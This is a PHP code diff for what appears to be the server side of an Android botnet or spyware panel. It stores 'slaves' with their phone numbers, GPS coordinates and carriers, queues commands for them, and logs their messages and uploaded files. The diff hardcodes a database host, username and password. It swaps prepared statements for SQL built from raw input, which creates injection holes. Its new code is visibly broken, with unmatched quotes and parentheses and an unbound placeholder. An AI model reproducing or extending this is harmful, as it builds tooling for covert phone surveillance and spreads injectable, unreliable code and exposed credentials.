@@ -7,8 +7,9 @@
     die();
   }
   
+    //$connect = new PDO("mysql:host=$dbhost;dbname=$dbname", $dbuser, $dbpass);
 	$connect = pg_connect("host=ec2-54-163-240-54.compute-1.amazonaws.com dbname=d97hqd0uu802gp user=vxoxyrownzuzgx password=0669e05248eea11fe4bdc6d93f82de2248a0dd9a9345ee09215f6f4d2d393862")
-    or die('No se ha podido conectar: ' . pg_last_error());
+    or die('No se ha podido conectar: ' or die('La consulta fallo: ' . pg_last_error());
 
 
 
@@ -16,13 +17,16 @@
 
 
 
+
+
+
+  
 
 function slave_exists($UID) {
 	global $connect;
-	$statement = $connect->prepare('SELECT * FROM bots WHERE uid=:uid');
-	$statement->bindParam(':uid', $UID, PDO::PARAM_STR);
-	$statement->execute();
-	$row = $statement->fetch(PDO::FETCH_ASSOC);
+	$statement = "SELECT uid FROM bots WHERE uid=:uid'";
+	$row = pg_query($statement) or die('La consulta fallo: ' . pg_last_error());
+
 	if(!$row){
 	  return false;
 	} else {
@@ -36,10 +40,15 @@ function setFunction($UID, $Function){
 	if(slave_exists($UID)){
 		$functions = getFunction($UID);
 		if($functions == ""){
-			mysql_query("UPDATE slaves SET Function='$Function' WHERE `Unique_ID` = '$UID'") or die(mysql_error());
+			$statement="UPDATE slaves SET Function='$Function' WHERE 'Unique_ID' = '$UID'") or die('La consulta fallo: ' . pg_last_error());
+			$statement1=pg_query($statement) or die('La consulta fallo: ' . pg_last_error());
 		} else {
+
 			$functions = $functions . ", " . $Function;
-			mysql_query("UPDATE slaves SET Function='$functions' WHERE `Unique_ID` = '$UID'") or die(mysql_error());
+
+			$statement="UPDATE slaves SET Function='$functions' WHERE 'Unique_ID' = '$UID'") or die('La consulta fallo: ' . pg_last_error());
+			$statement1=pg_query($statement) or die('La consulta fallo: ' . pg_last_error());
+
 		}
 	}
 }
@@ -54,26 +63,33 @@ function updateSlave($UID, $Device, $Version, $Coordinates, $Provider, $PhoneNum
   global $connect;
   
   if (slave_exists($UID)){
-	$statement = $connect->prepare("UPDATE bots SET device='$Device', version='$Version', lati='$Lati', longi='$Longi', provider='$Provider', phone='$PhoneNumber', sdk='$SDK', random='$Random' WHERE `uid` = '$UID'");
-	$statement->execute();
+	$statement = "UPDATE bots SET device='$Device', version='$Version', lati='$Lati', longi='$Longi', provider='$Provider', phone='$PhoneNumber', sdk='$SDK', random='$Random' WHERE 'uid' = '$UID'";
+	$statement1=pg_query($statement) or die('La consulta fallo: ' . pg_last_error());
+
+
+
   } else {
-    $statement = $connect->prepare("INSERT INTO `bots` (`uid`, `device`, `version`, `lati`, `longi`, `provider`, `phone`, `sdk`, `random`) VALUES ('$UID', '$Device', '$Version', '$Lati', '$Longi', '$Provider', '$PhoneNumber', '$SDK', '$Random')");
-	$statement->execute();
+
+    $statement = ("INSERT INTO 'bots' ('uid', 'device', 'version', 'lati', 'longi', 'provider', 'phone', 'sdk', 'random') VALUES ('$UID', '$Device', '$Version', '$Lati', '$Longi', '$Provider', '$PhoneNumber', '$SDK', '$Random')");
+
+	$statement1= pg_query($statement) or die('La consulta fallo: ' . pg_last_error());
+
+
   }
 }
 
 function addMessage($UID, $Message) {
   global $connect;
-  $statement = $connect->prepare("INSERT INTO `messages` (`uid`, `message`) VALUES ('$UID', '$Message')");
-  $statement->execute();
+  $statement = "INSERT INTO 'messages' ('uid', 'message') VALUES ('$UID', '$Message')");
+  $statement1=pg_query($statement) or die('La consulta fallo: ' . pg_last_error());
 }
 
 function addToUploads($owner, $slave, $file){
 	if(slave_exists($slave)){
       if(file_exists("dlfiles/" . $file)){
 	    global $connect;
-        $statement = $connect->prepare("INSERT INTO `files` (`uid`, `file`) VALUES ('$slave', '$file')");
-        $statement->execute();
+        $statement = "INSERT INTO 'files' ('uid', 'file') VALUES ('$slave', '$file')");
+        $statement1=pg_query($statement) or die('La consulta fallo: ' . pg_last_error());
       }
 	}
 }
